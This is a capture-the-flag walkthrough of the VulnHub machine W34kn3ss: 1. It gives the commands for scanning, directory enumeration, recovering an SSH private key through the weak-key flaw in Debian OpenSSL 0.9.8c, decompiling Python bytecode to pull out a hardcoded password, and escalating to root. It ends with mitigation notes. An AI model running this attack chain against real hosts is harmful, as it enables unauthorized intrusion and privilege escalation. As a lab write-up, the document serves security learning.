Title: W34kn3ss: 1 #python #openssl #ssh #enumeration 
https://www.vulnhub.com/entry/w34kn3ss-1,270/#

written by Magdalena Glas, 24.05.2019

-- Goal A. Host discovery in the local net
-- Goal B. Detection of open ports
-- Goal C. Directory enumeration and file exploration
-- Goal D. Find vulnerability 
-- Goal E. Encrypt SSH key
-- Goal F. SSH connect to remote host and retrieve files
-- Goal G. Decompile python programm and retrieve root password
-- Goal H. SSH connect, get root access with password

==============================================================
Tutorial: Step by step guide
==============================================================

A. Host discovery in the local net:

arp-scan -localnet nmap -p- -A

-> discovery of the vulnerable maschine with ip 192.168.56.105

------------------------------------------------------------------------------------
B. Port scanning with nmap

#nmap -p- -A
-> port 80 open
-> port 22 with ssh running
-> commonName of the server: weakness.jth

C. Check open port 80 http://192.168.56.105/
-> standard Ubuntu page, no further clue

------------------------------------------------------------------------------------
C. Explore directories

C.1 Use dirb to enumerate directories on a website
#dirb http://192.168.56.105
-> two directories: http://192.168.56.105/test/ and http://192.168.56.105/uploads

C.2 Browse through foun directories 
Open browser and try http://192.168.56.105/test/
-> picture with text "it's all about the keys :D", but no further clue

C.3 Add hostname to hosts file
The nmap scan showed the hostname weakness.jth
The domainname will be added to the host file to check if it has an effect on the browser
#edit /etc/hosts
add: 192.168.56.105 weakness.jth

Try on browser: weakness.jth
-> picture of white rabbit and hint "n30"

C.4 Use dirb again to enumerate the weakness website
dirb http://weakness.jth
-> two directories: weakness.jth/private/assets and weakness.jth/private/files

C.5 Explore directories
-> two files in the file directory: mykey.pub and notes.txt
-> notes.txt gives information about the other file: a key generated by openssl 0.9.8c-1

C.6 Download found files
Download mykey.pub file
#wget weakness.jth/private/files/mykey.pub

As we know about the open ssh port, one can assume the public key is for ssh identification

------------------------------------------------------------------------------------
D. Find vulnerability

As the notes.txt gave us information about the openssl version that the key was created with
we try to find any vulnerabilities of this version in the vulnerability database SearchSploit

D.1 Look up in SearchSploit database
#searchsploit openssl 0.9.8c-1
-> searchsploit has three exploit entries, we download one of them (id 5622)

D.2 Get Exploit details from searchsploit
#searchsploit -m 5622
#cat 5622.txt
-> the exploit tells us that there is only a limited number of ssh keys in this openssl version
that can be brute forced using a perl script and provides a github link where to get it from.

D.3 Download Exploit Script from github
#wget https://github.com/offensive-security/ex)ploitdb-bin-sploits/raw/master/bin-sploits/5622.tar.bz2 


----------------------------------------------------------------
E. Encrypt key using the OpenSSL vulnerbaility

E.1 Open and copy the key
#mykey.pub

****************************************************************
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguAeWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnskJJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yczZg+ZavtmfItQt1Vac1vSuBPCpTqkjE/4Iklgw== root@targetcluster
****************************************************************

E.2 Decode key
#grep -r -l "AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguAeWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnskJJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yczZg+ZavtmfItQt1Vac1vSuBPCpTqkjE/4Iklgw== "

****************************************************************
rsa/2048/4161de56829de2fe64b9055711f531c1-2537.pub
****************************************************************

----------------------------------------------------------------
F. SSH connect to remote server

F.1 Use key to get access to the remote server
#ssh -i rsa/2048/4161de56829de2fe64b9055711f531c1-2537 n30@192.168.56.105

****************************************************************
n30@W34KN3SS:~$ 
****************************************************************
-> SSH connection successful, now we try if we are already root

F.2 Try if already root access
#n30@W34KN3SS:~$ sudo -i

****************************************************************
[sudo] password for n30: 
****************************************************************

-> we are in the remote server, yet cannot access all parts as we don't have the root password

F.3 Look for further hints looking at files on the remote server

#n30@W34KN3SS:~$ ls

****************************************************************
code  user.txt
****************************************************************

Examine user file
#n30@W34KN3SS:~$ cat user.txt

****************************************************************
25e3cd678875b601425c9356c8039f68
****************************************************************

Examine code file:
#n30@W34KN3SS:~$ file code

****************************************************************
code: python 2.7 byte-compiled
****************************************************************

-> it is an compiled python file that we can maybe analyse

Copy code file to accessible folder:
#n30@W34KN3SS:~$ cp code /var/www/html

Cut SSH connection
#n30@W34KN3SS:~$ exit

---------------------------------------------------------------
G. Decompile Python programm

G.1 Download file ('code')
#wget http://192.168.56.105/code
-> running the file doesn't work, try to decompile

G.2 Install and use tool to decompile code
Install tool (uncompyle6) to decompile the file:
#pip install uncompyle6
-> the tool only takes files ending with .pyc, therefore we need to rename the code file

Rename file:
#mv code code.pyc

Decompile file:
#uncompyle6 -o . code.pyc

G.3 Run and analyse python program (code.py)
Compile program again to make it executable:
#chmod +x code.py

Run program
#python code.py
****************************************************************
	[+]System Started at : Thu May 23 12:07:40 2019
	[+]This binary should generate unique hash for the hardcoded login info
	[+]Generating the hash ..
	[+]Your new hash is : 21362b30a38999d4b47ba9c73107f92c6ce85392db0cce43e43501b70b70307f
	[+]Done
****************************************************************

->it says it is generating the hash we login information, so this login details should
be somewhere in the code, therefore we have a look at the python code


#cat code.py

****************************************************************
	 uncompyle6 version 3.3.3
	 Python bytecode 2.7 (62211)
	 Decompiled from: Python 2.7.15+ (default, Nov 28 2018, 16:27:22) 
	 [GCC 8.2.0]
	 Embedded file name: code.py
	 Compiled at: 2018-05-08 11:50:54
	import os, socket, time, hashlib
	print ('[+]System Started at : {0}').format(time.ctime())
	print '[+]This binary should generate unique hash for the hardcoded login info'
	print '[+]Generating the hash ..'
	inf = ''
	inf += chr(ord('n'))
	inf += chr(ord('3'))
	inf += chr(ord('0'))
	inf += chr(ord(':'))
	inf += chr(ord('d'))
	inf += chr(ord('M'))
	inf += chr(ord('A'))
	inf += chr(ord('S'))
	inf += chr(ord('D'))
	inf += chr(ord('N'))
	inf += chr(ord('B'))
	inf += chr(ord('!'))
	inf += chr(ord('!'))
	inf += chr(ord('#'))
	inf += chr(ord('B'))
	inf += chr(ord('!'))
	inf += chr(ord('#'))
	inf += chr(ord('!'))
	inf += chr(ord('#'))
	inf += chr(ord('3'))
	inf += chr(ord('3'))
	hashf = hashlib.sha256(inf + time.ctime()).hexdigest()
	print ('[+]Your new hash is : {0}').format(hashf)
	print '[+]Done'
****************************************************************

->yes! if we read from top to bottom we see the user nma n30 together with something
that could be a password (dMASDNB!!#B!#!#33)

----------------------------------------------------------------
H. Exploit

H.1 Connect with SSH again and try to get root access this time using the discovered password:
#ssh -i rsa/2048/4161de56829de2fe64b9055711f531c1-2537 n30@192.168.56.105
#n30@W34KN3SS:~$ sudo -l
#[sudo] password for n30: dMASDNB!!#B!#!#33
****************************************************************
	Matching Defaults entries for n30 on W34KN3SS:
    	env_reset, mail_badpass,
    	secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User n30 may run the following commands on W34KN3SS:
    	(ALL : ALL) ALL
****************************************************************

-> this means we are root. Now we can open the last flag (root.txt)


H.2 Open Last Flag
#root@W34KN3SS:~# cat root.txt

****************************************************************
a1d2fab76ec6af9b651d4053171e042e
****************************************************************

============================
Conclusion
----------------------------

The goal of this ctf is to exploit a openssl vulnerability, naming that when creating a key pair wirg openssl
there are only about 65.000 possibility. This number is comparbably little so the key pair can be brute forced. 
The steps of the exploit are to find the key file first, this required adding the host to the host file and a 
directory enumeration. After finding the key and getting information about the possible exploit using the vulnerability
database SearchSploit the key found can be decrypted. With this encrypted key we can access the remote host via ssh connection
and look for further hints to get root access. This leads us to a decompiled python file which can be downloaded and decompiled
and gives us the root password when looking at the python code. With this root password we can ssh connect again and find the final
flag in the root.txt file. 

The attack is possible because of mainly two reasons. The openssl vulnerability and the pthon code storing the password.
The first vulnerability can be mitigated by using a more recent version of openssl that offers a bigger key range. 
Secondly, a user should never store any passwords anywhere not encrypted like here in the python code.

=============================
Background Knwoledge
------------------------

1. Already knew: 

- networks(ip,subnetting)
- operating systems(ls,directory managment)
- directory enumeration

---------------------------------

2. Learned:

- host file manipulation
- openSSL vulnerability
- SSH connection using public key
- Python decompiling

==============================================


















